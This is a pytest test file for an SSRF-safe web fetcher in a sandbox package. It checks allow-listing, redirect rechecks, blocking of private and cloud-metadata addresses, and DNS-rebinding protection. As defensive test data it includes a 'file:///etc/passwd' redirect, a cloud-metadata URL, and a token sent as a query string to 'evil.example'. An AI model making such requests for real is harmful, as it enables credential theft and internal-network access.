"""The SSRF-safe fetcher: per-hop policy, public addresses only, pinned address, caps."""

from __future__ import annotations

import socket
import ssl
import threading
import time
from collections.abc import Callable, Iterator, Sequence
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from sandcage.sandbox import fetcher
from sandcage.sandbox.fetcher import (
    Fetcher,
    FetchFailure,
    Page,
    RawResponse,
    Request,
    http_transport,
)

PUBLIC = "151.101.0.223"
ALLOWED_HOSTS = {"pypi.org", "docs.python.org"}


def allow_listed(url: str) -> str | None:
    """A stand-in for the run's policy: the rulebook's two documentation hosts."""
    host = url.split("://", 1)[-1].split("/", 1)[0].split(":", 1)[0].lower()
    return None if host in ALLOWED_HOSTS else "Fetching from this site is not allowed."


@dataclass
class FakeDNS:
    answers: dict[str, list[list[str]]]
    calls: list[str] = field(default_factory=list)

    def __call__(self, host: str, port: int, *, timeout: float) -> Sequence[str]:
        self.calls.append(host)
        queue = self.answers.get(host)
        if not queue:
            raise OSError("no such host")
        return queue.pop(0) if len(queue) > 1 else queue[0]


@dataclass
class FakeWeb:
    pages: dict[tuple[str, str], RawResponse]
    requests: list[Request] = field(default_factory=list)
    fail_with: Exception | None = None

    def __call__(self, request: Request, *, deadline: float, max_bytes: int) -> RawResponse:
        self.requests.append(request)
        if self.fail_with is not None:
            raise self.fail_with
        page = self.pages[(request.host, request.target)]
        return RawResponse(
            page.status, page.headers, page.body[:max_bytes], len(page.body) > max_bytes
        )


def ok(body: bytes = b"hello", content_type: str = "text/plain") -> RawResponse:
    return RawResponse(200, {"content-type": content_type}, body, False)


def redirect(location: str, status: int = 302) -> RawResponse:
    return RawResponse(status, {"location": location}, b"", False)


def make(
    pages: dict[tuple[str, str], RawResponse],
    dns: dict[str, list[list[str]]] | None = None,
    check: Callable[[str], str | None] = allow_listed,
) -> tuple[Fetcher, FakeWeb, FakeDNS]:
    web = FakeWeb(pages)
    resolver = FakeDNS(dns if dns is not None else {host: [[PUBLIC]] for host in ALLOWED_HOSTS})
    return Fetcher(check, resolver=resolver, transport=web), web, resolver


def test_defaults() -> None:
    f = Fetcher(allow_listed)
    assert (f.timeout, f.max_bytes, f.max_redirects) == (10.0, 50_000, 5)


def test_fetches_an_allowed_url_with_the_pinned_address_and_the_real_name() -> None:
    f, web, dns = make({("pypi.org", "/project/pytest/?x=1"): ok(b"<h1>pytest</h1>", "text/html")})
    page = f.fetch("https://pypi.org/project/pytest/?x=1")
    assert isinstance(page, Page)
    assert (page.status, page.text, page.truncated) == (200, "<h1>pytest</h1>", False)
    assert web.requests == [Request("https", "pypi.org", 443, "/project/pytest/?x=1", PUBLIC)]
    assert dns.calls == ["pypi.org"]
    assert page.hops[0].address == PUBLIC
    assert page.hops[0].bytes_received == len(b"<h1>pytest</h1>")


def test_body_is_capped() -> None:
    f, _, _ = make({("pypi.org", "/"): ok(b"x" * 60_000)})
    page = f.fetch("https://pypi.org/")
    assert isinstance(page, Page)
    assert page.truncated
    assert len(page.text) == 50_000


def test_charset_from_the_content_type() -> None:
    f, _, _ = make(
        {("pypi.org", "/"): ok("café".encode("latin-1"), "text/html; charset=ISO-8859-1")}
    )
    page = f.fetch("https://pypi.org/")
    assert isinstance(page, Page)
    assert page.text == "café"


# --- redirects -----------------------------------------------------------------------


def test_redirect_to_an_allowed_host_is_followed_and_rechecked() -> None:
    checked: list[str] = []

    def check(url: str) -> str | None:
        checked.append(url)
        return allow_listed(url)

    f, web, _ = make(
        {
            ("pypi.org", "/old"): redirect("https://docs.python.org/3/"),
            ("docs.python.org", "/3/"): ok(b"docs"),
        },
        check=check,
    )
    page = f.fetch("https://pypi.org/old")
    assert isinstance(page, Page)
    assert page.url == "https://docs.python.org/3/"
    assert checked == ["https://pypi.org/old", "https://docs.python.org/3/"]
    assert [r.host for r in web.requests] == ["pypi.org", "docs.python.org"]
    assert [h.status for h in page.hops] == [302, 200]


def test_redirect_to_a_host_the_policy_refuses_is_blocked() -> None:
    f, web, _ = make({("pypi.org", "/"): redirect("https://collector.example.net/x")})
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "collector.example.net" in result.reason
    assert "not allowed" in result.reason
    assert [r.host for r in web.requests] == ["pypi.org"]


def test_relative_redirect() -> None:
    f, _, _ = make({("pypi.org", "/a"): redirect("/b", 301), ("pypi.org", "/b"): ok(b"b")})
    page = f.fetch("https://pypi.org/a")
    assert isinstance(page, Page)
    assert page.text == "b"


def test_redirect_loop_and_too_many_redirects_stop() -> None:
    f, _, _ = make({("pypi.org", "/a"): redirect("/b"), ("pypi.org", "/b"): redirect("/a")})
    loop = f.fetch("https://pypi.org/a")
    assert isinstance(loop, FetchFailure)
    assert "loop" in loop.reason

    chain = {("pypi.org", f"/{i}"): redirect(f"/{i + 1}") for i in range(10)}
    f, web, _ = make(chain)
    long = f.fetch("https://pypi.org/0")
    assert isinstance(long, FetchFailure)
    assert "more than 5 redirects" in long.reason
    assert len(web.requests) == 6


def test_redirect_to_a_non_http_scheme_is_refused() -> None:
    f, _, _ = make({("pypi.org", "/"): redirect("file:///etc/passwd")}, check=lambda _: None)
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "only http and https" in result.reason


# --- the address guard ---------------------------------------------------------------


@pytest.mark.parametrize(
    "address",
    ["127.0.0.1", "10.0.0.5", "169.254.169.254", "::1", "fd00:ec2::254", "::ffff:10.0.0.1"],
)
def test_private_addresses_are_never_contacted(address: str) -> None:
    f, web, _ = make({}, dns={"pypi.org": [[address]]})
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "never contacted" in result.reason
    assert web.requests == []


def test_a_name_resolving_to_any_private_address_is_refused() -> None:
    f, web, _ = make({}, dns={"pypi.org": [[PUBLIC, "10.0.0.7"]]})
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "10.0.0.7" in result.reason
    assert web.requests == []


def test_redirect_to_a_private_address_is_refused() -> None:
    f, web, _ = make(
        {("pypi.org", "/"): redirect("http://docs.python.org/latest/")},
        dns={"pypi.org": [[PUBLIC]], "docs.python.org": [["192.168.1.1"]]},
    )
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "192.168.1.1" in result.reason
    assert len(web.requests) == 1


def test_dns_rebinding_cannot_switch_the_address() -> None:
    """The name is resolved once per hop and the connection goes to that address, so a
    second, private answer is never used."""
    f, web, dns = make(
        {("pypi.org", "/"): ok(b"fine")}, dns={"pypi.org": [[PUBLIC], ["127.0.0.1"]]}
    )
    page = f.fetch("https://pypi.org/")
    assert isinstance(page, Page)
    assert dns.calls == ["pypi.org"]
    assert web.requests[0].address == PUBLIC


def test_ip_literal_hosts_are_classified() -> None:
    def check(url: str) -> str | None:
        return None

    f, web, _ = make({}, dns={"169.254.169.254": [["169.254.169.254"]]}, check=check)
    result = f.fetch("http://169.254.169.254/latest/meta-data/")
    assert isinstance(result, FetchFailure)
    assert "cloud metadata" in result.reason
    assert web.requests == []


@pytest.mark.parametrize(
    ("url", "phrase"),
    [
        ("https://user:pw@pypi.org/", "user name or password"),
        ("https://pypi.org:8443/", "default https port"),
        ("ftp://pypi.org/", "only http and https"),
        ("https:///nohost", "no host name"),
        ("https://pypi.org:99999/", "not a valid address"),
    ],
)
def test_malformed_or_unusual_urls_are_refused(url: str, phrase: str) -> None:
    f, web, _ = make({}, check=lambda _: None)
    result = f.fetch(url)
    assert isinstance(result, FetchFailure)
    assert phrase in result.reason
    assert web.requests == []


def test_network_errors_are_returned_not_raised() -> None:
    f, web, _ = make({})
    web.fail_with = ConnectionRefusedError(61, "refused")
    result = f.fetch("https://pypi.org/")
    assert isinstance(result, FetchFailure)
    assert "network error" in result.reason

    web.fail_with = TimeoutError()
    timed_out = f.fetch("https://pypi.org/")
    assert isinstance(timed_out, FetchFailure)
    assert "timed out" in timed_out.reason

    f2, _, _ = make({}, dns={})
    unresolved = f2.fetch("https://pypi.org/")
    assert isinstance(unresolved, FetchFailure)
    assert "could not be resolved" in unresolved.reason


def test_tokens_in_urls_are_masked_in_results() -> None:
    from tests.secrets_fixtures import GITHUB_TOKEN

    f, _, _ = make({("pypi.org", f"/?t={GITHUB_TOKEN}"): ok()})
    page = f.fetch(f"https://pypi.org/?t={GITHUB_TOKEN}")
    assert isinstance(page, Page)
    assert GITHUB_TOKEN not in page.url
    assert GITHUB_TOKEN not in page.hops[0].url
    refused, _, _ = make({}, check=lambda _: "no")
    failure = refused.fetch(f"https://evil.example/?t={GITHUB_TOKEN}")
    assert isinstance(failure, FetchFailure)
    assert GITHUB_TOKEN not in failure.reason


# --- the real transport against a local server ---------------------------------------


@dataclass
class Seen:
    hosts: list[str] = field(default_factory=list)


@pytest.fixture
def local_server() -> Iterator[tuple[int, Seen, dict[str, object]]]:
    seen = Seen()
    behaviour: dict[str, object] = {"body": b"local body", "stall": 0.0}

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            seen.hosts.append(self.headers.get("Host", ""))
            body = behaviour["body"]
            assert isinstance(body, bytes)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            stall = behaviour["stall"]
            assert isinstance(stall, float)
            if stall:
                self.wfile.write(body[:3])
                self.wfile.flush()
                time.sleep(stall)
            self.wfile.write(body)

        def log_message(self, format: str, *args: object) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    server.daemon_threads = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1], seen, behaviour
    finally:
        server.shutdown()
        server.server_close()


def test_transport_connects_to_the_pinned_address_with_the_original_host(
    local_server: tuple[int, Seen, dict[str, object]],
) -> None:
    port, seen, _ = local_server
    request = Request("http", "docs.example.test", port, "/x", "127.0.0.1")
    response = http_transport(request, deadline=time.monotonic() + 5, max_bytes=100)
    assert (response.status, response.body, response.truncated) == (200, b"local body", False)
    assert seen.hosts == [f"docs.example.test:{port}"]


def test_transport_caps_the_body(local_server: tuple[int, Seen, dict[str, object]]) -> None:
    port, _, behaviour = local_server
    behaviour["body"] = b"y" * 5000
    request = Request("http", "docs.example.test", port, "/", "127.0.0.1")
    response = http_transport(request, deadline=time.monotonic() + 5, max_bytes=1000)
    assert response.truncated
    assert response.body == b"y" * 1000


def test_transport_honours_one_deadline_when_the_server_stalls(
    local_server: tuple[int, Seen, dict[str, object]],
) -> None:
    port, _, behaviour = local_server
    behaviour["stall"] = 3.0
    request = Request("http", "docs.example.test", port, "/", "127.0.0.1")
    started = time.monotonic()
    with pytest.raises(TimeoutError):
        http_transport(request, deadline=started + 0.3, max_bytes=1000)
    assert time.monotonic() - started < 2.0


def test_https_uses_the_original_name_for_tls(
    monkeypatch: pytest.MonkeyPatch, local_server: tuple[int, Seen, dict[str, object]]
) -> None:
    port, _, _ = local_server
    names: list[str | None] = []

    class Recording(ssl.SSLContext):
        def wrap_socket(
            self, sock: socket.socket, *args: object, **kwargs: object
        ) -> ssl.SSLSocket:
            hostname = kwargs.get("server_hostname")
            names.append(hostname if isinstance(hostname, str) else None)
            raise ssl.SSLError("recorded")

    monkeypatch.setattr(ssl, "create_default_context", lambda: Recording(ssl.PROTOCOL_TLS_CLIENT))
    request = Request("https", "pypi.org", port, "/", "127.0.0.1")
    with pytest.raises(ssl.SSLError):
        http_transport(request, deadline=time.monotonic() + 5, max_bytes=100)
    assert names == ["pypi.org"]


def test_system_resolver_has_a_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    release = threading.Event()

    def hang(*args: object, **kwargs: object) -> list[object]:
        release.wait(5)
        return []

    monkeypatch.setattr(socket, "getaddrinfo", hang)
    started = time.monotonic()
    with pytest.raises(TimeoutError):
        fetcher.system_resolver("slow.example", 443, timeout=0.2)
    release.set()
    assert time.monotonic() - started < 2.0
